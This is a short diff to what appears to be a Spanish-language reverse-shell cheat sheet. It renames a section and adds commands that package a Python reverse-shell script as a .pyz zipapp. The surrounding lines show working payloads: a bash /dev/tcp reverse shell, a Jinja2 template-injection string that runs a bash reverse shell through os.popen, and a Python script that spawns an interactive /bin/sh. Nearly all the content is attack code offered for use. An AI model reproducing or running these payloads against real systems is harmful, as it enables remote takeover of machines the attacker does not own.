@@ -56,7 +56,7 @@ sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
 ```
 
-## Script en Python
+## Script en Python comprimido .pyz
 ```bash
 #!/bin/python3
 
@@ -82,4 +82,9 @@ def reverse_shell():
     subprocess.call(['/bin/sh', '-i'])
 
 reverse_shell()
+```
+```bash
+mkdir reverseshell
+mv revshell.py reverseshell
+python3 -m zipapp reverseshell -o revshell.pyz -m "revshell:revshell"
 ```
